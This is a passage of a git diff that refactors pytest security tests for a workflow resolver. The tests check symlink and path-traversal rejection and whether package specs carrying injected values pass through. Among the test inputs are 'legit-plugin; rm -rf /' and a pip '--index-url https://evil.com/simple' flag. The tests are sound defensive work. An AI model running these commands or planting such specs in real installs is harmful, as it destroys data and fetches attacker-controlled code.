-                    source=WorkflowPipelineSource(type="pypi", plugin_name="scope-fx"),
-                )
-            ]
+            pipelines=[make_pipeline("test", "pypi", plugin_name="scope-fx")]
         )
 
         plan = resolve_workflow(wf, pm, tmp_path)
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        assert plugin_items[0].status == "missing"
+        assert items_by_kind(plan, "plugin")[0].status == "missing"
 
     def test_invalid_source_type_rejected(self):
-        """Pydantic Literal rejects unknown source types."""
         from pydantic import ValidationError
 
         with pytest.raises(ValidationError):
@@ -963,13 +787,9 @@ class TestDegenerateInputs:
 
 
 class TestSymlinkAndPathEdgeCases:
-    """Path traversal, symlinks, and filesystem edge cases."""
-
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_symlink_inside_lora_dir_pointing_outside(self, mock_registry, tmp_path):
-        """Symlink in lora_dir -> file outside. resolve() follows it,
-        so the resolved path is outside lora_dir. Should be rejected.
-        """
+        """Symlink in lora_dir -> file outside: rejected as invalid."""
         mock_registry.is_registered.return_value = True
 
         lora_dir = tmp_path / "lora"
@@ -985,64 +805,43 @@ class TestSymlinkAndPathEdgeCases:
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                    loras=[WorkflowLoRA(filename="sneaky.safetensors")],
-                )
+                make_pipeline(loras=[WorkflowLoRA(filename="sneaky.safetensors")])
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        # Symlink resolves outside lora_dir, should be caught
-        assert lora_items[0].status == "missing"
-        assert lora_items[0].detail == "Invalid LoRA filename"
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.status == "missing"
+        assert lora.detail == "Invalid LoRA filename"
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_absolute_path_in_lora_filename(self, mock_registry, tmp_path):
-        """Absolute path should not resolve to within lora_dir."""
         mock_registry.is_registered.return_value = True
         (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                    loras=[WorkflowLoRA(filename="/etc/passwd")],
-                )
-            ]
+            pipelines=[make_pipeline(loras=[WorkflowLoRA(filename="/etc/passwd")])]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "missing"
-        assert lora_items[0].detail == "Invalid LoRA filename"
+        lora = items_by_kind(plan, "lora")[0]
+        assert lora.status == "missing"
+        assert lora.detail == "Invalid LoRA filename"
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_lora_filename_with_null_byte(self, mock_registry, tmp_path):
-        """Null byte in filename: should not crash."""
+        """Null byte in filename: should reject or handle gracefully."""
         mock_registry.is_registered.return_value = True
         (tmp_path / "lora").mkdir()
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                    loras=[WorkflowLoRA(filename="evil\x00.safetensors")],
-                )
+                make_pipeline(loras=[WorkflowLoRA(filename="evil\x00.safetensors")])
             ]
         )
 
-        # Should either reject or handle gracefully
-        try:
-            plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-            lora_items = [i for i in plan.items if i.kind == "lora"]
-            assert lora_items[0].status == "missing"
-        except (ValueError, OSError):
-            pass  # acceptable to raise on null bytes
+        with pytest.raises(ValueError, match="null"):
+            resolve_workflow(wf, mock_plugin_manager(), tmp_path)
 
     @patch("scope.core.pipelines.registry.PipelineRegistry")
     def test_lora_dir_does_not_exist(self, mock_registry, tmp_path):
@@ -1050,71 +849,41 @@ class TestSymlinkAndPathEdgeCases:
         mock_registry.is_registered.return_value = True
 
         wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="test_pipe",
-                    source=WorkflowPipelineSource(type="builtin"),
-                    loras=[WorkflowLoRA(filename="test.safetensors")],
-                )
-            ]
+            pipelines=[make_pipeline(loras=[WorkflowLoRA(filename="test.safetensors")])]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-        lora_items = [i for i in plan.items if i.kind == "lora"]
-        assert lora_items[0].status == "missing"
+        assert items_by_kind(plan, "lora")[0].status == "missing"
 
 
 class TestPackageSpecInjection:
-    """Untrusted package_spec values flow through to action strings and pip.
+    """Untrusted package_spec values flow through to action strings.
+    Known limitation: not validated at resolution layer. The trust-gate UI
+    shows the raw spec before install, and subprocess uses list args."""
 
-    Known limitation: package_spec is not validated at the resolution layer.
-    The trust-gate UI shows the raw spec to the user before any install occurs,
-    and subprocess uses list args (no shell injection). The risk is limited to
-    social engineering via misleading display strings.
-    """
-
+    @pytest.mark.parametrize(
+        "spec,expected_substring",
+        [
+            ("legit-plugin; rm -rf /", "rm -rf"),
+            ("legit-pkg --index-url https://evil.com/simple", "--index-url"),
+        ],
+    )
     @patch("scope.core.pipelines.registry.PipelineRegistry")
-    def test_shell_metacharacters_in_package_spec(self, mock_registry, tmp_path):
-        """package_spec with shell metacharacters passes through to action string."""
+    def test_shell_metacharacters_pass_through(
+        self, mock_registry, tmp_path, spec, expected_substring
+    ):
         mock_registry.is_registered.return_value = False
 
         wf = make_workflow(
             pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="evil",
-                    source=WorkflowPipelineSource(
-                        type="git",
-                        plugin_name="legit-plugin",
-                        package_spec="legit-plugin; rm -rf /",
-                    ),
+                make_pipeline(
+                    "evil",
+                    "git",
+                    plugin_name="legit-plugin",
+                    package_spec=spec,
                 )
             ]
         )
 
         plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        # Payload is in the action string that gets shown in UI and passed to pip
-        assert "rm -rf" in plugin_items[0].action
-
-    @patch("scope.core.pipelines.registry.PipelineRegistry")
-    def test_package_spec_with_pip_install_flags(self, mock_registry, tmp_path):
-        """package_spec with pip flags passes through to action string."""
-        mock_registry.is_registered.return_value = False
-
-        wf = make_workflow(
-            pipelines=[
-                WorkflowPipeline(
-                    pipeline_id="sneaky",
-                    source=WorkflowPipelineSource(
-                        type="git",
-                        plugin_name="sneaky-plugin",
-                        package_spec="legit-pkg --index-url https://evil.com/simple",
-                    ),
-                )
-            ]
-        )
-
-        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
-        plugin_items = [i for i in plan.items if i.kind == "plugin"]
-        # The malicious --index-url flag passes through
-        assert "--index-url" in plugin_items[0].action
+        assert expected_substring in items_by_kind(plan, "plugin")[0].action
